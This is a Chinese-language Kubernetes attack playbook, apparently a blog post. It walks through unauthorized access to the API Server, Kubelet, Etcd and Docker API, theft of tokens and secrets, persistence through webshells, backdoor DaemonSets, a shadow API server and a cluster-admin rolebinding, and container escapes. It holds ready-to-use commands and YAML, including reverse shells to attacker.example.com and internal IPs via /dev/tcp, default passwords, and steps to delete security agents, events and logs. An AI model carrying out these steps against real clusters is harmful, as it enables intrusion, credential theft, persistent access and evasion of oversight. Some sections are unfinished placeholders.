---
title: "Kubernetes 攻击操作手册"
date: 2026-07-15
tags: ["kubernetes", "cloud-native", "container-security", "penetration-testing"]
summary: "一份 Kubernetes 渗透测试速查手册：从服务指纹识别、未授权访问（Dashboard/API Server/Kubelet/Etcd/Docker API），到拿到权限后的持久化、痕迹清理与权限下的容器逃逸技巧。"
toc: true
draft: false
---

> 本文仅涵盖已获书面授权的安全测试场景，聚焦已广泛公开的 Kubernetes 常见配置错误类别（未授权访问、弱口令、组件暴露）。文中命令与 YAML 均为教学示例，敏感的内网域名/主机名/IP 已替换为占位符。

## 常见服务指纹与内网扫描

Kubernetes 架构下常见的开放服务指纹如下：

- kube-apiserver: 6443, 8080
- kubectl proxy: 8080, 8081
- kubelet: 10250, 10255, 4149
- docker api: 2375
- etcd: 2379, 2380
- kubeflow-dashboard: 8080

我们可以对局域网整个范围进行端口扫描，重点探测这些端口。局域网地址范围分三类：

- C 类：192.168.0.0 - 192.168.255.255
- B 类：172.16.0.0 - 172.31.255.255
- A 类：10.0.0.0 - 10.255.255.255

## 初始访问

### K8s Dashboard未授权访问

访问k8s
dashboard，看面板左下角是否有"跳过"选项，如面板有"跳过"选项则登陆dashboard，登陆后看是否有权限操作整个集群。或访问/ui通过未授权访问进入dashboard。

![](/img/research/kubernetes-attack-playbook/image1.png)

![](/img/research/kubernetes-attack-playbook/image2.png)

### K8s API Server未授权访问

使用端口扫描工具批量扫描8080端口和6443端口

**测试思路**：扫描常见K8s端口，验证是否为未授权

依赖权限：网络可达

参考工具：Nmap、TXportmap

测试过程：

Nmap 192.168.0.1/24 --p 8080,6443

  ---------------- ------------------------------------------------------
                   

                   

                   

                   

                   

                   
  ---------------- ------------------------------------------------------

对于开放8080端口的ip，执行curl <http://ip:8080>

返回如下结果证明存在未授权访问

![](/img/research/kubernetes-attack-playbook/image3.png)

例：发现8081端口为k8s的api server

![](/img/research/kubernetes-attack-playbook/image4.png)

使用工具Kubectl 连接控制k8s集群

Kubectl -s xx.xx.xx.xx:8081 get namespaces

![](/img/research/kubernetes-attack-playbook/image5.png)

访问6443端口，查看是否存在未授权

查看pods：https://ip:6443/pods

![](/img/research/kubernetes-attack-playbook/image6.png)

![](/img/research/kubernetes-attack-playbook/image7.png)

如上，存在未授权访问。

访问/api/v1/namespces/kube-system/secrets获得token，从而控制整个集群

kubectl -s "https://ip:6443/" --insecure-skip-tls-verify
--token="" get ns -o wide

### Kubelet未授权访问

批量扫描开放了10250端口的IP

Nmap 192.168.0.1/24 --p 10250

对于开放10250的IP

curl https://192.168.20.121:10250/pods -k（不存在未授权访问）

![](/img/research/kubernetes-attack-playbook/image8.png)

浏览器访问https://192.168.xx.xx250/pods

可以看到以下接口信息，证明存在未授权访问

![](/img/research/kubernetes-attack-playbook/image9.png)

可以使用工具kubeletctl进行利用执行命令

查看pods信息：./kubeletctl -s <ip> pods

![](/img/research/kubernetes-attack-playbook/image10.png)

对指定容器进行命令执行

./kubeletctl --s <ip> -p <POD_name> -n <NAMESPACE_name> -c
<CONTAINERS> exec "uname -a"

![](/img/research/kubernetes-attack-playbook/image11.png)

获取当前pod下所有token

./kubeletctl_linux_amd64 -s 203.0.113.10 scan token

获取集群地址

./kubeletctl_linux_amd64 -s 203.0.113.10 metrics|grep 6443

![](/img/research/kubernetes-attack-playbook/image12.png)

使用token和api server地址控制整个集群

./kubectl -s https://ip:6443/ --insecure-skip-tls-verify --token=""
get nodes

除了10250端口之后，k8s
10255是只读端口，我们同样可以访问去看下是否存在一些敏感信息泄露（关注env和entrypoint）

![](/img/research/kubernetes-attack-playbook/image13.png)

### Etcd未授权访问

批量扫描2379端口

Nmap 192.168.0.1/24 --p 2379

对开放了2379端口的IP进行访问

curl http://ip:2379/version

![](/img/research/kubernetes-attack-playbook/image14.png)

如上，存在未授权访问

获取所有key：

./etcdctl --insecure-transport=false --insecure-skip-tls-verify
--endpoints=https://ip:2379/ get / --prefix --keys-only | grep
secrets/kube-system/clusterrole
![](/img/research/kubernetes-attack-playbook/image15.png)

获取指定key的token：

./etcdctl --endpoints=http://ip:2379 get
/registry/secrets/kube-system/clusterrole-aggregation-controller-token-knhrs

![](/img/research/kubernetes-attack-playbook/image16.png)

复制出token

![](/img/research/kubernetes-attack-playbook/image17.png)

然后加上token，对api server进行集群控制

./kubectl -s "https://ip:6443/" --insecure-skip-tls-verify
--token="" get nodes

这里可以[配置客户端配置文件](#客户端生成config文件)，将token和api
server地址写进配置文件中，从而简化命令进行执行。

简化后：./kubectl get nodes

### Docker API未授权访问

批量扫描2375端口

访问http://ip:2375/version，出现如下数据存在未授权访问

![](/img/research/kubernetes-attack-playbook/image18.png)

远程对被攻击主机的docker容器进行操作

docker -H tcp://x.x.x.x:2375 images

![](/img/research/kubernetes-attack-playbook/image19.png)

远程启动被攻击主机的docker容器，并且将该宿主机的根目录挂载到容器的/mnt目录下

docker -H tcp://x.x.x.x:2375 run -it-v /:/mnt imageID /bin/bash

![](/img/research/kubernetes-attack-playbook/image20.png)

### K8s config文件泄漏

当获取到宿主机root权限时，可在\~/.kube/config处获取到config文件

![](/img/research/kubernetes-attack-playbook/image21.png)

利用config文件控制集群

kubectl --kubeconfig config get pods

![](/img/research/kubernetes-attack-playbook/image22.png)

### 私有镜像仓库暴露

找到Harbor仓库，尝试通过默认用户名密码:admin/Harbor12345进行登录寻找镜像仓库

或注册通过harbor漏洞注册一个管理员权限用户

![](/img/research/kubernetes-attack-playbook/image23.png)

进入后台后，对其进行审计发现敏感信息。

## 执行

### Kubectl进入容器

需要k8s存在api server未授权或者找到kube config文件

1.  存在api server未授权

kubectl -s xx.xx.xx.xx:8080 exec -it test -- /bin/bash

2）有kube config文件

kubectl --kubeconfig config exec -it test -- /bin/bash

![](/img/research/kubernetes-attack-playbook/image24.png)

### 暴力破解

1）找到api server的IP进行端口扫描

![](/img/research/kubernetes-attack-playbook/image25.png)

2）横向扫描开放了22端口的机器，进行爆破

使用hydra爆破ssh弱口令

https://github.com/vanhauser-thc/thc-hydra

hydra -L logins.txt -P passwords.txt ssh://ip

### 通过NodePod访问Service

扫描k8s nodeport的端口

"默认情况下，K8s集群NodePort分配的端口范围为：30000-32767

Txportmap -i <ip段> -p 30000-32767

### K8S secrets收集

**kubectl get secrets -A**

![](/img/research/kubernetes-attack-playbook/image26.png)

读取secret内容

./kubectl get secret <sectret_name> -n <namespace_name> -o yaml

**利用**secret**进入harbor镜像仓库：**

从secrets中找到Harbor仓库

获得Master权限时

./kubectl get secrets -A | grep harbor

![](/img/research/kubernetes-attack-playbook/image27.png)

读取secrets信息

./kubectl get secret <sectret_name> -n <namespace_name> -o yaml

![](/img/research/kubernetes-attack-playbook/image28.png)

将所指数据到<https://jwt.io/>进行解密

![](/img/research/kubernetes-attack-playbook/image29.png)

### ConfigMaps获取

容器内：./cdk run k8s-configmap-dump auto

集群内：./kubectl get configmaps -A

将所有配置输出到文件configmaps.txt

![](/img/research/kubernetes-attack-playbook/image30.png)

容器内

![](/img/research/kubernetes-attack-playbook/image31.png)

失败时

![](/img/research/kubernetes-attack-playbook/image32.png)

### ServiceAccount凭据泄露

当获得一个pod权限时，尝试直接读取token

cat /var/run/secrets/kubernetes.io/serviceaccount/token

![](/img/research/kubernetes-attack-playbook/image33.png)

### 窃取凭证攻击其他应用

通过容器内信息收集得到的secrets或其他配置文件，找到其他服务的账号密码，如mysql,sqlserver等数据库的账号密码。

如文件：/app/resources/application-local.yml

### 应用层API凭据泄露

容器内：

Cdk会根据ak的特征获取证书文件

./cdk run ak-leakage <app_dir>

![](/img/research/kubernetes-attack-playbook/image34.png)

集群搜索secrets：

./kubectl get secrets --namespaces

![](/img/research/kubernetes-attack-playbook/image35.png)

### 云产品AK泄露

Xxxxx

### 利用K8S 准入控制器窃取信息

XXXXX

## 持久化

### 部署WebShell或内存马

云原生工具CDK：

<https://github.com/cdk-team/CDK/releases/>

1、部署webshell

当获取到容器权限时，可生成接受随机POST参数的PHP或JSP
webshell写入web目录下。

Usage:

cdk run webshell-deploy (php|jsp) <path>

Example:

./cdk run webshell-deploy php /tmp/shell.php

![](/img/research/kubernetes-attack-playbook/image36.png)

使用 curl -d "cdk_sgrytry=system(whoami)" 连接webshell.

使用冰蝎注入内存马：

![](/img/research/kubernetes-attack-playbook/image37.png)

### 部署后门Pod

通过daemonset将用户指定的后门镜像部署到每个node。

Usage:

./cdk run k8s-backdoor-daemonset
(default|anonymous|<service-account-token-path>) <image>

Example:

部署一个 pod image:ubuntu 到每一个节点:

./cdk run k8s-backdoor-daemonset default ubuntu

![](/img/research/kubernetes-attack-playbook/image38.jpeg)

### 部署影子K8s api-server

部署一个shadow apiserver，该api server具有和集群中现存的api
server一致的功能，同时开启了全部K8s管理权限，接受匿名请求且不保存审计日志。便于攻击者无痕迹的管理整个集群以及下发后续渗透行动。

Usage:

./cdk run k8s-shadow-apiserver
(default|anonymous|<service-account-token-path>)

Example:

./cdk run k8s-shadow-apiserver default

![](/img/research/kubernetes-attack-playbook/image39.jpeg)

### 部署K8s CronJob

### 方法一

使用yaml创建，cronjob.yaml内容如下

image需要修改

```yaml
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: hello
spec:
  schedule: "*/1 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: registry.example.internal/library/mytomcat:v20.0.0
            imagePullPolicy: IfNotPresent
            args:
            - /bin/sh
            - -c
            - date; echo Hello from the Kubernetes cluster
          restartPolicy: OnFailure
```

./kubectl create -f cronjob.yaml

![](/img/research/kubernetes-attack-playbook/image40.png)

删除cronjob

./kubectl delete cronjob <NAME_name>

![](/img/research/kubernetes-attack-playbook/image41.png)

### 方法二

部署K8s CronJob定时创建用户指定的image并运行cmd。

Usage:

cdk run k8s-cronjob (default|anonymous|<service-account-token-path>)
(min|hour|day|<cron-expr>) <image> <args>

Example:

./cdk run k8s-cronjob default min alpine "echo hellow;echo cronjob"

![](/img/research/kubernetes-attack-playbook/image42.jpeg)

执行后

![](/img/research/kubernetes-attack-playbook/image43.jpeg)

### 部署静态pods

1、创建一个 YAML 文件，并保存在 web 服务上，为 kubelet 生成一个 URL。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: static-web
  labels:
    role: myrole
spec:
  containers:
  - name: web
    image: nginx
    ports:
    - name: web
      containerPort: 80
      protocol: TCP
```

2、通过在选择的节点上使用 --manifest-url=<manifest-url> 配置运行
kubelet。 在 Fedora 添加下面这行到 /etc/kubernetes/kubelet ：

KUBELET_ARGS="--cluster-dns=10.254.0.10 --cluster-domain=kube.local
--manifest-url=<manifest-url>"

3、重启 kubelet。在 Fedora 上，你将运行如下命令：

*\# 在 kubelet 运行的节点上执行以下命令*

systemctl restart kubelet

### 覆写容器生命周期hooks

创建容器的yaml中在poststart和prestop,分别在容器创建后执行和容器销毁前执行

[root@SHE-L0563377 tmp]# vim tomcat-deploy1.yaml

```yaml
apiVersion: apps/v1
kind: Deployment  # 确保在任何时候都有特定数量的 Pod 副本处于运行状态
metadata:
  name: tomcat
  labels:
    k8s-app: tomcat-demo
spec:
  replicas: 3  # 指定 Pod 副本数量
  selector:
    matchLabels:
      app: tomcat
  template:
    metadata:
      labels:
        app: tomcat
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: tomcat
        image: registry.example.internal/official/tomcat:8-jdk8
        imagePullPolicy: IfNotPresent
        lifecycle:
          postStart:
            exec:
              command: ["bash"]  # 反弹 Shell
              args: ["-c", "bash -i >& /dev/tcp/attacker.example.com/11111 0>&1"]
        securityContext:
          privileged: true  # 特权模式
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
          type: Directory
```

### 修改核心组件访问权限

通过configmap修改kubelet使其关闭认证并允许匿名访问，或暴露API
Server未授权的HTTP端口。

### Daemonsets deployments

控制DaemonSets和Deployments在集群中部署远控容器/pod

./ kubectl apply -f nginxdockerSock.yaml

image需要修改

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-ingress-controller1
  labels:
    k8s-app: nginx-ingress-controller1
  namespace: kube-system
spec:
  replicas: 2
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: nginx
        image: registry.example.internal/official/nginx-ingress-controller:v0.32.0
        imagePullPolicy: IfNotPresent
        command: ["/bin/sleep", "3650d"]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /var/run/docker.sock
          name: docker-sock
        - mountPath: /tmp/tmp1/
          name: tmp-tool
      volumes:
      - name: docker-sock
        hostPath:
          path: /var/run/docker.sock
      - name: tmp-tool
        hostPath:
          path: /tmp/
```

![](/img/research/kubernetes-attack-playbook/image44.png)

### 使用恶意镜像

方法一：在dockerfile中加入额外的恶意指令层来执行恶意代码

方法二：直接编辑原始镜像的文件层，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像

![](/img/research/kubernetes-attack-playbook/image45.png)

修改Dockerfile文件

cat /root/aaa/Dockerfile

echo "RUN mkdir /chijiuhua" >> /root/aaa/Dockerfile

cat /root/aaa/Dockerfile

![](/img/research/kubernetes-attack-playbook/image46.png)

### K8s Rolebinding添加用户权限

./kubectl create rolebinding superbackdoor --clusterrole=cluster-admin
--serviceaccount default:superbackdoor

![](/img/research/kubernetes-attack-playbook/image47.png)

## 容器逃逸

### 利用K8S漏洞提权逃逸

CVE-2021-25741条件：

有创建pod的权限，kubelet在漏洞影响范围内

Vulnerable versions of the kubelet:

v1.22.0 - v1.22.1

v1.21.0 - v1.21.4

v1.20.0 - v1.20.10

<= v1.19.14

https://github.com/Betep0k/CVE-2021-25741

### 通过内核漏洞提权逃逸

容器共享宿主机内核，因此我们可以使用宿主机的内核漏洞进行容器逃逸，比如通过内核漏洞进入宿主机内核并更改当前容器的namespace，在历史内核漏洞导致的容器逃逸当中最广为人知的便是脏牛漏洞（CVE-2016-5195）了。

同时，近期还有一个比较出名的内核漏洞是
CVE-2020-14386，也是可以导致容器逃逸的安全问题。

这些漏洞的POC 和
EXP都已经公开，且不乏有利用行为，但同时大部分的EDR和HIDS也对EXP的利用具有检测能力，这也是利用内核漏洞进行容器逃逸的痛点之一。

### 使用CDK尝试一键逃逸

./cdk auto-escape id

失败时

![](/img/research/kubernetes-attack-playbook/image48.png)

### 特权容器内利用挂载逃逸

### 挂载了设备进行逃逸

首先在privileged特权容器内fdisk -l
查看宿主机磁盘情况，如有回显则确认在privileged特权容器内；

然后，将宿主机的根目录挂载到容器内部去，进而操作宿主机任意文件，如crontab
config file,或者 /root/.ssh/authorized_keys, /root/.bashrc等，实现逃逸

### 挂载了宿主机/etc目录

宿主机如果以特权模式启动容器，可以在该容器内部进行逃逸

./cdk run mount-disk

![](/img/research/kubernetes-attack-playbook/image49.jpeg)

etc目录最简单的利用方式就是写入crontab了

echo "*/1 * * * * root /bin/bash -i >& /dev/tcp/172.17.0.6/10000
0>&1" >> /mnt/crontab

然后等待反弹shell就行

失败时

![](/img/research/kubernetes-attack-playbook/image50.png)

### 挂载了宿主机cgroup目录

宿主机cgroup目录挂载到容器内，通过劫持宿主机cgroup的release_agent文件，通过linux
cgroup notify_on_release机制触发shellcode执行，完成逃逸。

./cdk run mount-cgroup "<shell-cmd>"

此命令无回显

![](/img/research/kubernetes-attack-playbook/image51.jpeg)

### 重写Cgroup以访问设备

重写当前容器内的 /sys/fs/cgroup/devices/devices.allow，逃逸特权容器访问宿主机内的文件。

./cdk run rewrite-cgroup-devices

失败时：

![](/img/research/kubernetes-attack-playbook/image52.png)

### 挂载宿主机/Proc文件系统

find / -name proc找到挂载的proc目录，未找到则无法逃逸

找到后使用cdk执行命令

./cdk run mount-procfs <proc-dir> "<shell-cmd>"

手动写shell：

确定容器overlay位置

/data/docker/overlay2/d7f802561c9efea4b256201d411043b873691c2a1359ef978b32db1fee6d5d72/merged/

![](/img/research/kubernetes-attack-playbook/image53.emf)

开始写入shell

![](/img/research/kubernetes-attack-playbook/image54.emf)

把命令写进到core_pattern中

echo -e
"|/data/docker/overlay2/d7f802561c9efea4b256201d411043b873691c2a1359ef978b32db1fee6d5d72/merged/tmp/1.py
\\rcore" > /host-proc/sys/kernel/core_pattern

![](/img/research/kubernetes-attack-playbook/image55.emf)

编译一个异常的程序

#include <stdio.h>

int main(void)

{

int *a = NULL;

*a = 1;

return 0;

}

可以通过在容器上编译，如果容器内部不存在gcc这种编译工具可以在自己的电脑上编译然后复制上去。

![](/img/research/kubernetes-attack-playbook/image56.emf)

这边有几个需要注意的是core_pattern内部是没有环境变量的，所以我们所有的命令必须接上全部的路径不要去省略，不然是找不到执行的文件的。

### 挂载了宿主机LXCFS目录包含CGOURP

当POD挂载了LXCFS目录包含CGOURP目录，并且对CGROUP有写权限。

通过mount命令查看是否存在lxcfs

mount|grep lxcfs

![](/img/research/kubernetes-attack-playbook/image57.emf)

如果没有mount命令也可以看/proc/1/mountinfo

![](/img/research/kubernetes-attack-playbook/image58.emf)

![](/img/research/kubernetes-attack-playbook/image59.emf)

/data/test/lxcfs/cgroup/devices/ 下有设备的cgroup

找到我们当前主机的cgroup地址

![](/img/research/kubernetes-attack-playbook/image60.emf)

我们把device.allow设置容器允许访问设备

echo a > cgroup/devices/kubepods/XXXXX/devices.allow

然后寻找mountinfo中挂载/etc/目录的node节点这边是253,2

![](/img/research/kubernetes-attack-playbook/image61.emf)

然后运行debugfs test b 253
1然而在实际运行的时候发现失败了，后面发现debugfs命令运行的时候无法打开filesystem

![](/img/research/kubernetes-attack-playbook/image62.emf)

重新测试发现我们当前的centos测试文件系统的问题，换一个系统重复上述过程运行debugfs发现我们成功看到宿主机的文件系统了，那么通过修改宿主机文件系统就可以实现容器逃逸了。

![](/img/research/kubernetes-attack-playbook/image63.emf)

失败时：

![](/img/research/kubernetes-attack-playbook/image64.png)

### 利用linux capability逃逸

./cdk_linux_amd64 evaluate

查询到有特殊capability权限

![](/img/research/kubernetes-attack-playbook/image65.png)

![](/img/research/kubernetes-attack-playbook/image66.png)

### 利用挂载的docker.sock逃逸

找到被挂载的docker.sock文件

find / -name "docker.sock"

扫描宿主机2375端口开启且未授权，可以尝试用docker客户端进行访问

![](/img/research/kubernetes-attack-playbook/image67.emf)

利用-H参数建立连接docker -H xxxxx:2375

![](/img/research/kubernetes-attack-playbook/image68.emf)

下载docker二进制文件，docker二进制是golang编写的所以我们完全不用担心这个文件的依赖问题。

在别的机器上准备好这个二进制文件

![](/img/research/kubernetes-attack-playbook/image69.emf)

我们可以直接用docker执行命令了，这边由于我在创建靶场的时候默认把docker
sock放在了/var/run/docker.sock上，如果碰到一些特殊的环境我们可能不是这个文件，就需要使用-H命令来指定

./docker -H unix:///var/run/docker.sock ps

![](/img/research/kubernetes-attack-playbook/image70.emf)

这边我们就直接使用吧

![](/img/research/kubernetes-attack-playbook/image71.emf)

然后可以借此启动一个挂载宿主机根目录的特权容器，完成简单逃逸：

./docker run -it -v /:/host --privileged --name=sock-test ubuntu
/bin/bash

![](/img/research/kubernetes-attack-playbook/image72.emf)

也可使用 cdk

Link: https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-check

https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-pwn

### K8S RoleBinding添加用户权限

./kubectl create sa superbackdoor

![](/img/research/kubernetes-attack-playbook/image73.png)

./kubectl create rolebinding superbackdoor --clusterrole=cluster-admin
--serviceaccount default:superbackdoor

![](/img/research/kubernetes-attack-playbook/image74.png)

### 容器获得sys_ptrace_capbility导致的逃逸

如果有cap_sys_ptrace的cap就可以使用ptrace的特权，有这个特权可以对其他进程进行调试或者进程注入。但是由于namespace的存在，无法直接访问到宿主机的pid。因此这里一般需要容器的pid
namespace使用宿主机的。

所以cap_sys_ptrace逃逸条件：

- 容器有CAP_SYS_PTRACE权限

- 容器与宿主机共用用pid namespace(--pid=host 打破进程隔离)

- 没有apparmor保护

![](/img/research/kubernetes-attack-playbook/image75.png)

cat /proc/self/status | grep Cap

![](/img/research/kubernetes-attack-playbook/image76.png)

![](/img/research/kubernetes-attack-playbook/image77.png)

这个时候选择宿主机中的进程，来对进程注入代码：

https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

shellcode随意，msf即可：

![](/img/research/kubernetes-attack-playbook/image78.png)

### 利用大权限的 Service Account

使用Kubernetes做容器编排的话，在POD启动时，Kubernetes会默认为容器挂载一个
Service Account 证书。同时，默认情况下Kubernetes会创建一个特有的 Service
用来指向 ApiServer。

有了这两个条件，我们就拥有了在容器内直接和APIServer通信和交互的方式。\
Kubernetes Default Service

![](/img/research/kubernetes-attack-playbook/image79.png)

![](/img/research/kubernetes-attack-playbook/image80.png)

Default Service Account

![](/img/research/kubernetes-attack-playbook/image81.png)

默认情况下，这个 Service Account 的证书和 token 虽然可以用于和
Kubernetes Default Service 的 APIServer 通信，但是是没有权限进行利用的。

但是集群管理员可以为 Service Account 赋予权限：

![](/img/research/kubernetes-attack-playbook/image82.png)

此时直接在容器里执行 kubectl 就可以集群管理员权限管理容器集群。

![](/img/research/kubernetes-attack-playbook/image83.png)因此获取一个拥有绑定了
ClusterRole/cluster-admin Service Account 的
POD，其实就等于拥有了集群管理员的权限。

### 创建特权容器挂载宿主机文件系统

### 在任意node上创建特权容器

tq.yaml内容

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: testmm
spec:
  containers:
  - image: <image_name>
    name: containerpapub
    imagePullPolicy: IfNotPresent
    securityContext:
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

Image需要改动，获取所有pods

./kubectl get pods --w wide

![](/img/research/kubernetes-attack-playbook/image84.png)

选择一个pod查看详细信息

./kubectl describe pod <pod_name>

可以看到所pod所使用的镜像，替换yaml里的Image即可

![](/img/research/kubernetes-attack-playbook/image85.png)

./kubectl create --f tq.yaml 创建特权容器

![](/img/research/kubernetes-attack-playbook/image86.png)

查看是否创建成功

./kubectl get pods --o wide

执行命令查看是否挂载成功

./kubectl exec <pod_name> -- ls /mnt/

![](/img/research/kubernetes-attack-playbook/image87.png)

进入特权容器

./kubectl exec --it <pod_name> -- sh

切换根目录

cd /mnt

chroot . bash

![](/img/research/kubernetes-attack-playbook/image88.png)

写计划任务逃逸

echo "*/1 * * * * root /bin/bash -i >&
/dev/tcp/10.244.21.101/9999 0>&1" >> /etc/crontab

### 在Master上创建特权容器

当获取到集群控制权限时

找到Master的node

kubectl get nodes --o wide

![](/img/research/kubernetes-attack-playbook/image89.png)

去除污点才可在Master上创建pod

kubectl taint node <node_name> node-role.kubernetes.io/master-

![](/img/research/kubernetes-attack-playbook/image90.png)

查看taint，值为<None>可创建pod

kubectl describe node <node_name>

![](/img/research/kubernetes-attack-playbook/image91.png)

Yaml中需要加入nodeSelector并添加label

![](/img/research/kubernetes-attack-playbook/image92.png)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: testmm4
spec:
  containers:
  - image: registry.example.internal/base/middleware/stock_tomcat:8.5.65-jdk1.8.0_221-20220824113813-demo
    name: containerpapub
    imagePullPolicy: IfNotPresent
    securityContext:
      allowPrivilegeEscalation: true
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
  nodeSelector:
    kubernetes.io/hostname: node-example-01
```

测试后将taint修改回来

kubectl taint node <node_name>
node-role.kubernetes.io/master:NoSchedule

## 防御逃逸

### 关闭安全产品

./kubectl get deployments -A

![](/img/research/kubernetes-attack-playbook/image93.png)

发现安全产品hivesec

导出yaml：./kubectl get deployment hiveagent -n hivesec -o yaml

复制内容另存为hivesec1.yaml

删除安全产品：./kubectl delete -f hivesec1.yaml

### 删除K8s的Event

./kubectl delete event --field-selector
involvedObject.name=<pod_name>

![](/img/research/kubernetes-attack-playbook/image94.png)

### 容器及宿主机日志清理（Clear container logs）

ls /var/log/containers/

![](/img/research/kubernetes-attack-playbook/image95.png)

备份后删除再恢复

代理访问

Shadow API Server

利用系统Pod伪装

创建超长Annotations使Audit日志解析失败

K8s Audit日志清理

## 引用处

### 客户端生成config文件

**利用token和api
server生成kubectl客户端配置文件（后续命令不用再指定-s和--token）**

kubectl config set-cluster kubernetes --insecure-skip-tls-verify=true
--server=https://IP:6443/

kubectl config set-credentials admin --token=xxxx

kubectl config set-context kubernetes --cluster=kubernetes
--user=admin

kubectl config use-context kubernetes

![](/img/research/kubernetes-attack-playbook/image96.png)

### KubeSphere Dashboard暴露

Kubesphere的默认口令是admin/
P@88w0rd，如果不修改密码我们可以通过这个口令登录到系统内如下所示：

![](/img/research/kubernetes-attack-playbook/image97.png)

Kubesphere提供了kubectl命令从而让我们可以直接操作k8s集群。

![](/img/research/kubernetes-attack-playbook/image98.png)

在该窗口能直接使用kubectl，我们可以利用kubectl创建一个特权容器实现容器逃逸

![](/img/research/kubernetes-attack-playbook/image99.png)
